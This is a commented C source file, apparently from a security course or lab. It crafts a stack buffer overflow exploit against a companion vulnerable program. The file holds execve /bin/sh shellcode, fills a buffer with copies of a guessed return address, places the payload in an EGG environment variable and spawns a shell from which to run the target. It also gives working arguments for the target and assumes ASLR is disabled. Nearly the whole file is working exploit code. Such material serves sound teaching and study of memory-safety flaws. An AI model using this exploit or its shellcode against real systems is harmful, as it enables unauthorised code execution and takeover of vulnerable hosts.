// gcc -ggdb -o guess_offset guess_offset.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// naive buffer overflow recon script
// attempt to guess the address of the target vulnerable buffer and
// generate a naive exploit:
// 1. put shellcode into the buffer
// 2. pad the buffer to overflow
// 3. smash the return pointer with the guessed buffer address
//    (i.e. the address of our shellcode)
// 4. spawn a shell with the exploit buffer as an env var
// 5. (as the user) run the vulnerable command, passing in the
//    exploit as required to target the vulnerable buffer.
//
// This approach is naive because we have to guess the exact address.
// A better approach is to use a NOP pad to give us a bigger area to aim for.
//
// Usage:
// Run this program to craft an exploit buffer. It spawns a shell where
// the target program can be run. The exploit is in env var $EGG.
//
// ./guess_offset [exploit buffer size] [target buffer offset guess]
// > ./target $EGG
//
// target (from stack_overflow_target.c) can be exploited with:
// > ./guess_offset 600 1048
#define DEFAULT_OFFSET      0
#define DEFAULT_BUFFER_SIZE 512

// execve /bin/sh; exit 0
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

// return the stack pointer
unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void main(int argc, char *argv[]) {
  // our exploit string: defines an environment variable
  // with shellcode and many copies of the address we are guessing
  // the buffer starts at.
  char *buff;

  // the address we are guessing the vulnerable buffer starts at
  long addr;

  char *ptr;
  long *addr_ptr;
  int i;

  // our guess at the offset from SP to the vulnerable buffer
  // in the target program at time of exploit
  // assumes this program and the target program have the same stack
  // start address (i.e. no ASLR)
  // In this script the offset must be exactly right. Anything else
  // will segfault/illegal instruction.
  int offset = DEFAULT_OFFSET;

  // the size of our exploit buffer
  // this should be big enough to overflow the target buffer and reach
  // the return pointer. It doesn't have to be exact because the guessed
  // buffer start address is copied many times - as long as one of the
  // copies smashes RET we execute the code at the guessed address.
  // Target buffer size + ~100 is a reasonable guess.
  int bsize = DEFAULT_BUFFER_SIZE;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if(!(buff = malloc(bsize))) {
    printf("Can't allocate memory\n");
    exit(1);
  }

  // known address of the buffer in stack_overflow_target.c
  // when the exploit is in argv[1]:
  // (findable with args 600 1048. I got these by working backwards from
  // a memory dump of target)
  // addr = 0xffffd6d8;

  // guess the address based on offset
  addr = get_sp() - offset;
  printf("Guess address: 0x%x\n", addr);

  // the address of our exploit buffer
  ptr = buff;
  addr_ptr = (long*) ptr;

  // copy the address into the exploit buffer many times
  for (i = 0; i < bsize; i +=4) {
    *(addr_ptr++) = addr;
  }

  // copy the shellcode into the exploit buffer, starting 4 bytes in
  ptr += 4;
  for (i = 0; i < strlen(shellcode); i ++) {
    *(ptr++) = shellcode[i];
  }

  // buf:
  // EGG=[...SHELLCODE...] AAAA AAAA AAAA [...etc]
  // (gdb) x/512xb (buff)

  // terminate the exploit
  buff[bsize - 1] = '\0';

  // put the exploit in an env variable and spawn a shell where
  // we can run the vulnerable program
  memcpy(buff, "EGG=", 4);
  putenv(buff);

  printf("spawning test shell\n");
  system("/bin/bash");
  printf("exiting get_offset...\n");
}
